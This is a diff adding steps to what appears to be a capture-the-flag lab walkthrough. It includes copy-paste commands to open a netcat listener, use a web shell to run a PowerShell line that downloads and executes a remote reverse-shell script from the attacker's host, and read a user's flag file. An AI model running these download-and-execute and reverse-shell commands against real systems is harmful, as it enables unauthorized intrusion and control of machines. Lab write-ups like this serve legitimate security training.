@@ -228,6 +228,33 @@ mv shell.ps1 www
 cd www
 python -m http.server
 ````
+Open a new terminal window and start a NetCat listener:
+Copy-paste this into you terminal:
+````
+nc -lnvp 9001
+````
+Now go back to your cmd.php shell.
+Copy-paste the following into the cmd line:
+````
+powershell iex(new-object net.webclient).downloadstring('http://<your-ip>:8000/shell.ps1')
+````
+
+<img width="1917" height="487" alt="image" src="https://github.com/user-attachments/assets/f4c16480-b0b9-42a3-8fcf-bf113634738f" />
+
+You should get a confirmation from the server that you got a GET request:
+<img width="1917" height="97" alt="image" src="https://github.com/user-attachments/assets/c80cea10-2f09-486f-8e98-c1fc80539df4" />
+
+And a return from the listener:
+<img width="1917" height="142" alt="image" src="https://github.com/user-attachments/assets/8253fce2-9700-4aa4-bd2f-8e0053756726" />
+
+Navigate to phoebe's desktop and type the user.txt.
+Copy-paste the following into the nc shell:
+````
+type \users\phoebe\desktop\user.txt
+````
+<img width="1917" height="152" alt="image" src="https://github.com/user-attachments/assets/6e9320c1-64b8-4bf4-a5e6-3bec1d5ebc8d" />
+
+
 
 
 
